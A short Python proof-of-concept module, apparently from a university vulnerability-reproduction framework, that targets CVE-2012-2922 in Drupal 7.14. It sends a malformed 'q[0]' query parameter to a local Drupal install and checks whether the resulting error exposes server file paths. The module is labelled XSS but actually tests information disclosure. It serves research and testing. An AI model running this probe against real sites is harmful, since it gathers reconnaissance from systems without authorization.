
# Copyright 2013 University of Maryland.  All rights reserved.
# Use of this source code is governed by a BSD-style
# license that can be found in the LICENSE.TXT file.


import sys
import time
from selenium.common.exceptions import NoSuchElementException
import framework


class Exploit (framework.Exploit):

    attributes = {'Name' :        "CVE_2012_2922",
                  'Description' : "Drupal 7.14 (Core) XSS Vulnerabilities",
                  'References' :  ['http://seamster.cs.umd.edu/vulwiki/index.php/CVE-2012-2922'],
                  'Target' :      "Drupal 7.14",
                  'TargetLicense' : '',
                  'VulWikiPage' : "",
                  'Type' : 'INFO'
                  }

    def __init__(self, visible=False):
        framework.Exploit.__init__(self, visible)
        self.verified = False
        return
            
    def exploit(self):
        self.logger.info("Running Exploit()")
        payload = "q[0]=some_garbage"

        driver = self.create_selenium_driver()
        driver.get("http://localhost/drupal/index.php?"+payload)
        self.logger.info("Page opened successfully: %s", driver.title)
        element = driver.get_element(by_xpath="//div[@class='messages error']")
        self.logger.info("Displayed Error Message: " + element.text)

        try:
            driver.get_element(by_xpath="//em[text()='/var/www/drupal/includes/bootstrap.inc']")
            self.logger.info("Information disclosure success")
            self.verified = True
        except NoSuchElementException:
            self.logger.error("Failed to disclose information")

        
        if self.visible:
            time.sleep(10)
        
        driver.cleanup()
        return

    def verify(self):
        return self.verified
        


        

